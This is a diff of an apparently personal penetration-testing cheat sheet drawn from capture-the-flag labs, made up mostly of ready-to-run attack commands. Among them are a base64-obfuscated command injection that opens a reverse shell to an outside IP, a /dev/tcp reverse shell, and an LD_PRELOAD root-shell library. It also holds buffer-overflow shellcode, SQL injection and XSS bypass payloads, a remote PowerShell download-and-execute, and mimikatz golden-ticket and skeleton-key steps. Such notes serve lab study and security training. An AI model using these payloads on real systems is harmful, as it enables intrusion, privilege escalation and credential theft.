@@ -14,25 +14,25 @@ john --wordlist=<dict file> --format='dynamic=sha512($p.$s)' <pass file>
 
 #### SSH Keys(id_rsa)
 
-```
+```bash
 ssh2john <id_rsa> > <outputfile>
 ```
 
 OR
 
-```
+```bash 
 python3 /opt/ssh2john.py
 ```
 
 OR
 
-```
+```bash
 python /usr/share/john/ssh2john.py
 ```
 
 ### hashcat
 
-```
+```bash
 hashcat -m 13100 -a 0 hash.txt Pass.txt
 ```
 
@@ -40,14 +40,14 @@ hashcat -m 13100 -a 0 hash.txt Pass.txt
 
 ### GPG, PGP
 
-```
+```bash
 gpg --import priv.key(or .asc)
 gpg <filename>.gpg(or <filename>.pgp)
 ```
 
 To crack passphrase, 
 
-```
+```bash
 pgp2john <file>.asc > hash.txt
 john -w <wordlist_path>.txt hash.txt
 ```
@@ -90,6 +90,22 @@ john -w <wordlist_path>.txt hash.txt
   ```bash
   smbget -R smb://<ip>/anonymous
   ```
+  
+  or Login via smbclient and then
+  
+  ```bash
+  smb: \>mget *
+  ```
+  
+  
+  
+- If it doesn't return ping, and want to enumerate SMB
+
+  ```bash
+  smbclient -L \\\\<ip>\\ -N
+  ```
+
+  
 
 ### FTP
 
@@ -106,12 +122,12 @@ If cannot download completely, try `ftp> binary`
 
 - copy files/directories from one place to another on the server 
 
-  ```
+  ```bash
   SITE CPFR
   SITE CPTO
   ```
 
-  ```
+  ```bash
   nc 10.10.41.232 21                                               
   220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.41.232]
   SITE CPFR /home/kenobi/.ssh/id_rsa 
@@ -154,11 +170,21 @@ Going to localhost:9000 on my machine, will load imgur traffic using my other se
 
   on browser, type "localhost:<LPORT>"
 
+
+
+use socat instead;
+
+```bash
+/tmp/socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
+```
+
+
+
 ### Redis
 
 [Hacktricks](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)
 
-```
+```bash
 redis-cli -h <IP>
 AUTH <password>
 INFO
@@ -169,7 +195,7 @@ GET <key>
 
 ### Rsync
 
-```
+```bash
 nc <IP> 873
 @RSYNCD: 31.0
 #list
@@ -177,20 +203,20 @@ nc <IP> 873
 
 List files
 
-```
+```bash
 rsync -av --list-only rsync://<IP>/<shared_name>
 ```
 
 Copy/Upload files
 
-```
+```bash
 rsync -av rsync://<IP>:873/<shared_name>/<file_path> .
 rsync -av <file> rsync://<IP>:873/<shared_name>
 ```
 
 Copy/Upload files if you have credential
 
-```
+```bash
 rsync -av authorized_keys rsync://username@<IP>/home_user/.ssh
 ```
 
@@ -216,6 +242,54 @@ If you need to move other containers, you need to open new shell.
   -rwsr-sr-x 1 root  root  1113504 Jul 22  2020  .suid_bash
   ./.suid_bash -p
   ```
+  
+- If a command contain suid bit,
+
+  ```bash
+  $ ltrace <command>
+  ```
+
+  and find `getenv("admin")`
+
+  ```bash
+  $ export admin=1
+  ```
+
+- If you are already root but not interactive shell;
+
+  ```bash
+  chmod +s /bin/bash
+  ```
+
+  then,
+
+  ```bash
+  /bin/bash -p
+  ```
+
+
+### Excutable files
+
+```bash
+$ groups
+> users <username>
+$ find / -group users -type f 2>/dev/null
+```
+
+
+
+### Capabilities
+
+```bash
+getcap -r / 2>/dev/null
+setcap cap_setuid+ep /usr/bin/python2.7
+/usr/bin/python2.7 = cap_setuid+ep
+
+#Exploit
+/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");
+```
+
+
 
 ### Crontab
 
@@ -263,6 +337,19 @@ bash -i >& /dev/tcp/10.13.35.230/4444 0>&1
   kenobi@kenobi:/tmp$ /usr/bin/menu
   ```
 
+  or `chmod 4755 <script>`
+
+- another way
+
+  if `(root) NOPASSWD: /usr/sbin/shutdown` and `poweroff` is in `shutdown` (check with `strings`)
+
+  ```bash
+  fox@year-of-the-fox:/tmp$ cp /bin/bash ./poweroff
+  fox@year-of-the-fox:/tmp$ sudo  "PATH=/tmp:$PATH" /usr/sbin/shutdown
+  ```
+
+  
+
 ### NFS
 
 In /etc/exports, no_root_squash flag means all folders in NFS is owned by root and have root priviledge.
@@ -299,20 +386,20 @@ to check which port is open for nfs. Then, reverse ssh via that port.
 
   On victim machine
 
-  ```
+  ```bash
   cp /bin/bash bash
   ```
 
   On attacker machine, in /tmp/nfs
 
-  ```
+  ```bash
   sudo chown root:root bash
   sudo chmod 4777 bash
   ```
 
   On victim machine
 
-  ```
+  ```bash
   ./bash -p
   ```
 
@@ -329,7 +416,7 @@ rm -r /tmp/nfs
 
 execute command as  other user
 
-```
+```bash
 sudo -u <user> <command>
 ```
 
@@ -348,6 +435,31 @@ If you see `User alice may run the following commands on ssalg-gnikool:
 sudo -h ssalg-gnikool /bin/bash
 ```
 
+- if `env_keep+=LD_PRELOAD` is set, make shell.c as follows:
+
+  ```c
+  #include <stdio.h>
+  #include <sys/types.h>
+  #include <stdlib.h>void _init() {
+   unsetenv("LD_PRELOAD");
+   setgid(0);
+   setuid(0);
+   system("/bin/bash");
+  }
+  ```
+
+  then,
+
+  ```bash
+  gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+  sudo LD_PRELOAD=/home/webdeveloper/shell.so <command>
+  ```
+
+
+### lxd
+
+If uid lxd is enabled, read [this](https://www.hackingarticles.in/lxd-privilege-escalation/)
+
 ### SQL expose
 
 on attacker machine,
@@ -362,23 +474,23 @@ SELECT * FROM <table>;
 
 ### Enumerate services (Ex. TeamCity)
 
-```
+```bash
 <target> $ ss -tulpn
 ```
 
 If you find ports only for local, Ex. **[::ffff:127.0.0.1]:8111**
 
-```
+```bash
 <target> $ wget http://127.0.0.1:8111
 ```
 
-```
+```bash
 ssh -L 8111:127.0.0.1:8111 <user>@<IP> -i id_rsa
 ```
 
 on Browser, search `http://localhost:8111`
 
-```
+```bash
 <ssh> $ grep -iR "authentication token" 2>/dev/null
 ```
 
@@ -390,7 +502,7 @@ If argv[1] is used, use `./<script> $(python -c "<command>")`
 
 Else if get() or getline() is used, use `./<script> < <(python -c "<command>")` or `./<script> < out.txt`
 
-```
+```bash
 gdb -q <file_path>
 (gdb) r $(python -c "print('A' * 155)")
 
@@ -404,7 +516,7 @@ You can assume offset is 152
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
 ```
 
-```
+```bash
 (gdb) r 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8A...'
 (gdb) i r
 ...
@@ -412,14 +524,14 @@ rbp            0x6641396541386541	0x6641396541386541
 ...
 ```
 
-```
+```bash
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 6641396541386541
 Exact match at offset 144
 ```
 
 From above, you can see offset is 144, registry is 8, so you need 152 bytes to reach return address.
 
-```
+```bash
 (gdb) r $(python -c "print('A' * 152 + 'BBBBBBBB')")
 (gdb) x/xg $rsp
 0x7fffffffe2c8: 0x4242424242424242
@@ -431,7 +543,7 @@ The script is owned by user with uid 1003, `pwn shellcraft -f d amd64.linux.setr
 
 Then, pick shell from [here](http://shell-storm.org/shellcode/)
 
-```
+```bash
 (gdb) r $(python -c "print('\x90' * 86 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 'A' * 36 + 'BBBBBBBB')")
 (gdb) x/100x $rsp-160
 0x7fffffffe228: 0x9090909090909090      0x9090909090909090
@@ -448,9 +560,9 @@ Then, pick shell from [here](http://shell-storm.org/shellcode/)
 0x7fffffffe2d8: 0x0000000200000000      0x00000000004005e0
 ```
 
-As you see above, you can pick address suck as 0x7fffffffe268
+As you see above, you can pick address such as 0x7fffffffe268
 
-```
+```bash
 (gdb) r $(python -c "print('\x90' * 86 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 'A' * 36 + '\x68\xe2\xff\xff\xff\x7f\x00\x00')")
 process 5250 is executing new program: /usr/bin/bash
 sh-4.2$
@@ -461,6 +573,20 @@ Successfully got shell!
 ```
 ./<service> $(python -c "print('\x90' * 86 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 'A' * 36 + '\x68\xe2\xff\xff\xff\x7f\x00\x00')")
 sh-4.2$
+```
+
+
+
+### Kernel(overlayfs)
+
+37292.c
+
+if gcc is not available on target but only cc,
+
+```bash
+sed -i "s/gcc/cc/g" 37292.c
+cc ofs.c -o ofs
+./ofs
 ```
 
 
@@ -678,7 +804,7 @@ If you need to receive data, add s.recv(1024)
 
 Setup Mona
 
-```
+```bash
 !mona config -set workingfolder c:\mona\%p
 ```
 
@@ -698,30 +824,30 @@ Send "A" * offset + "B" * 4 and make sure EIP is 42424242
 
 Generate badarray with mona in Immunity debugger
 
-```
+```bash
 !mona bytearray -b "\x00<and other bad char>"
 ```
 
 Send all chars as payload and see which is bad char
 
-```
+```python
 for x in range(1, 256):
     print("\\x" + "{:02x}".format(x), end='')
 ```
 
-```
+```bash
 !mona compare -f C:\mona\appname\bytearray.bin -a <ESP>
 ```
 
 Find jmp esp
 
-```
+```bash
 !mona jmp -r esp -cpb "\x00<and other bad chars>"
 ```
 
 Make payload
 
-```
+```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<port> EXITFUNC=thread -b "\x00<and other bad chars>" -f c
 ```
 
@@ -846,7 +972,7 @@ Show owner of file: `Get-Acl C:/`
 
   Or WES-NG:
 
-  ```
+  ```bash
   pip install wesng
   wes.py --update
   wes.py systeminfo_out.txt
@@ -900,7 +1026,7 @@ Don't forget to migrate!
 
 ### Impacket
 
-```
+```bash
 secretsdump.py <user>@<domain>
 ```
 
@@ -912,7 +1038,7 @@ After obtain NT hashes, use **evil-winrm**
 
 after get meterpreter shell, 
 
-```
+```bash
 meterpreter> run post/multi/gather/firefox_creds
 ```
 
@@ -920,7 +1046,7 @@ Change the file names to correct one... Ex. cert9.db, logins.json
 
 Then, use [python script ](https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py) 
 
-```
+```bash
 python3 firefox_decrypt.py <file path> 
 ```
 
@@ -1057,7 +1183,6 @@ transfer zip to attacker machine
     Get-NetComputer -fulldata | select operatingsystem
     ```
 
-  ### 
 
 ### Harvesting & Brute-Forcing Tickets w/ Rubeus
 
@@ -1071,13 +1196,13 @@ Rubeus.exe harvest /interval:30
 
 add the IP and domain name to the hosts file from the machine by using the echo command:
 
-```
+```powershell
 echo 10.10.122.227 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
 ```
 
 take a given password and "spray" it against all found users then give the .kirbi TGT for that user 
 
-```
+```powershell
 Rubeus.exe brute /password:Password1 /noticket
 ```
 
@@ -1089,7 +1214,7 @@ Rubeus.exe brute /password:Password1 /noticket
 
   dump the Kerberos hash of any kerberoastable users
 
-  ```
+  ```powershell
   Rubeus.exe kerberoast
   ```
 
@@ -1097,7 +1222,7 @@ Rubeus.exe brute /password:Password1 /noticket
 
   dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like  Rubeus does; however, this does not have to be on the targets machine  and can be done remotely.
 
-  ```
+  ```bash
   cd /usr/share/doc/python3-impacket/examples/
   sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.122.227 -request
   hashcat -m 13100 -a 0 hash.txt rockyou.txt
@@ -1105,13 +1230,13 @@ Rubeus.exe brute /password:Password1 /noticket
 
 - method 3: When you already in target machine; To gain Username,
 
-  ```
+  ```powershell
   PS> setspn -T medin -Q */*
   ```
 
   And then gain password hash
 
-  ```
+  ```powershell
   PS> iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') 
   PS> Invoke-Kerberoast -OutputFormat hashcat |fl
   ```
@@ -1120,7 +1245,7 @@ Rubeus.exe brute /password:Password1 /noticket
 
 - query ASReproastable accounts w/Impacket 
 
-  ```
+  ```bash
   GetNPUsers.py <domain>/<user>
   ```
 
@@ -1128,7 +1253,7 @@ Rubeus.exe brute /password:Password1 /noticket
 
 ### AS-REP Roasting w/ Rubeus
 
-```
+```powershell
 Rubeus.exe asreproast
 ```
 
@@ -1146,14 +1271,14 @@ minikatz is very good post-exploitation tool
 
 Ensure outputs [output '20' OK] if it does not that means you do not have the administrator  privileges to properly run mimikatz
 
-```
+```bash
 > mimikatz.exe
 privilege::debug
 ```
 
 export all of the base64 encoded .kirbi tickets into the directory that you are currently in
 
-```
+```bash
 sekurlsa::tickets /export
 ```
 
@@ -1161,7 +1286,7 @@ sekurlsa::tickets /export
 
 run this command inside of  mimikatz with the ticket that you harvested from earlier. It will cache  and impersonate the given ticket
 
-```
+```bash
 kerberos::ptt <ticket>
 ```
 
@@ -1169,7 +1294,7 @@ exit minikaz.
 
 verifying that we successfully impersonated the ticket by listing our cached tickets.
 
-```
+```bash
 > klist
 ```
 
@@ -1181,14 +1306,14 @@ A silver ticket can  sometimes be better used in engagements rather than a golde
 
 #### Dump the krbtgt hash
 
-```
+```bash
 > mimikatz.exe
 privilege::debug
 ```
 
 dump the hash as well as  the security identifier needed to create a Golden Ticket. To create a  silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService  account.
 
-```
+```bash
 lsadump::lsa /inject /name:krbtgt
 ```
 
@@ -1198,7 +1323,7 @@ or `lsadump::lsa /patch` to dump hashes for users
 
 Creating a golden ticket. To create a silver ticket simply put a service NTLM hash into the krbtgt  slot, the sid of the service account into sid, and change the id to  1103.
 
-```
+```bash
 Kerberos::golden /user:Administrator /domain:controller.local /sid:<sid> /krbtgt:<ticket> /id:<id>
 ```
 
@@ -1212,7 +1337,7 @@ Kerberos::golden /user:Administrator /domain:controller.local /sid:<sid> /krbtgt
 
 open a new elevated command prompt with the given ticket in mimikatz.
 
-```
+```bash
 misc::cmd
 ```
 
@@ -1220,14 +1345,14 @@ misc::cmd
 
 #### Preparing Mimikatz
 
-```
+```bash
 > mimikatz.exe
 privilege::debug
 ```
 
 #### Installing the Skeleton Key w/ mimikatz
 
-```
+```bash
 misc::skeleton
 ```
 
@@ -1237,7 +1362,7 @@ misc::skeleton
 
   The share will now be accessible without the need for the Administrators password
 
-  ```
+  ```bash
   net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
   ```
 
@@ -1245,7 +1370,7 @@ misc::skeleton
 
   access the directory of Desktop-1 without ever knowing what users have access to Desktop-1
 
-  ```
+  ```bash
   dir \\Desktop-1\c$ /user:Machine1 mimikatz
   ```
 
@@ -1323,6 +1448,14 @@ dnsrecon -t brt -d acmeitsupport.thm
 
 
 
+- escape server-side filter
+
+  ```bash
+  \";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC40LjYwLjIxMy8xMjM0NSAwPiYxCg== | base64 -d | bash\n\"
+  ```
+
+  
+
 ## XSS
 
 xsshunter
@@ -1339,7 +1472,7 @@ try `<script>user.changeEmail('attacker@hacker.thm'); </script>`
 
 Payload which escape attributes, tags and bypass filters 
 
-```
+```bash
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
 ```
 
@@ -1375,7 +1508,36 @@ document.cookie = "token=<admin_cookie>"
 
 ## SQL Injection
 
-### union
+### In-Band
+
+```sql
+1 UNION SELECT 1
+1 UNION SELECT 1,2,3
+0 UNION SELECT 1,2,3
+0 UNION SELECT 1,2,database() //find database 'sqli_one'
+0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
+0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
+```
+
+### Blind
+
+```sql
+admin123' UNION SELECT 1;--
+admin123' UNION SELECT 1,2,3;-- 
+admin123' UNION SELECT 1,2,3 where database() like '%';--
+admin123' UNION SELECT 1,2,3 where database() like 's%';--
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
+admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
+admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
+admin123' UNION SELECT 1,2,3 from users where username like 'a%
+admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
+```
+
+Or can use sleep() instead. Ex. `UNION SELECT SLEEP(5),2;--`
+
+### union (practice)
 
 Set if we have four selected fields.
 
@@ -1561,13 +1723,13 @@ If already complete log poisoning, do `curl http://<ip>:<port>/<file> -o <file>`
 
 - copy from REMOTE to LOCAL
 
-  ```
+  ```bash
   scp <user>@<remote_IP>:<path> <local_path>
   ```
 
 - copy from LOCAL to REMOTE
 
-  ```
+  ```bash
   scp <loacl_path> <user>@<remote_IP>:<path>
   ```
 
@@ -1576,7 +1738,7 @@ If already complete log poisoning, do `curl http://<ip>:<port>/<file> -o <file>`
 
 ### wfuzz (scan subdomain)
 
-```
+```bash
 wfuzz -c -f subdomains.txt -w ../../Tools/wordlists/subdomains-top1million-5000.txt -u "http://cmess.thm/" -H "Host: FUZZ.cmess.thm" --hw 290
 ```
 
@@ -1588,6 +1750,12 @@ vulnerability scanner
 
 ```bash
 nikto -h <ip>
+```
+
+fuzzing directory with basic authemtication
+
+```bash
+nikto -h <ip> -port <port> -id <user>:<password>
 ```
 
 
@@ -1616,7 +1784,13 @@ hydra -P <wordlist> -v <ip> <protocol>
   hydra -l admin -P ../../Tools/wordlists/rockyou.txt ssh://10.10.20.207
   ```
 
+- Http authentication
 
+  ```bash
+  hydra -l <username> -P /usr/share/wordlists/rockyou.txt <IP> -s <port> http-get
+  ```
+
+  
 
 ### SQLMap
 
@@ -1630,7 +1804,7 @@ sqlmap -r <file>.txt --dbms=mysql --dump
 
 use hash to gain shell
 
-```
+```bash
 evil-winrm -i 10.10.163.204 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
 ```
 
@@ -1642,19 +1816,19 @@ evil-winrm -i 10.10.163.204 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
 
 - Subdomain
 
-  ```
+  ```bash
   ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.127.35 -fs <size>
   ```
 
 - Username
 
-  ```
+  ```bash
   ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.165.153/customers/signup -mr "username already exists"
   ```
 
 - Passwords
 
-  ```
+  ```bash
   ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.165.153/customers/login -fc 200
   ```
 
@@ -1662,15 +1836,23 @@ evil-winrm -i 10.10.163.204 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
 
 ## Files
 
+### binwalk
+
+```bash
+binwalk -e <file>
+```
+
+
+
 ### exiftool
 
-```
+```bash
 exiftool <file_path>
 ```
 
 delete all metadata
 
-```
+```bash
 exiftool -all= <file_path>
 ```
 
@@ -1690,7 +1872,7 @@ hexedit <file>
 steghide info <file>
 ```
 
-```
+```bash
 steghide extract -sf <file>
 ```
 
@@ -1712,18 +1894,26 @@ Imported files can be alternative.
 
 Ex. in a.py,
 
-```
+```python
 import random
 ...
 ```
 
 You can make random.py 
 
-```
+```bash
 echo '/bin/bash' > random.py
 ```
 
 
+
+- If some words are restricted, use built-in functions
+
+  ```python
+  __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')
+  ```
+
+  
 
 ## HTML
 
@@ -1735,7 +1925,7 @@ echo '/bin/bash' > random.py
 
 ## ROT13
 
-```
+```bash
 echo '<word>' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
 ```
 
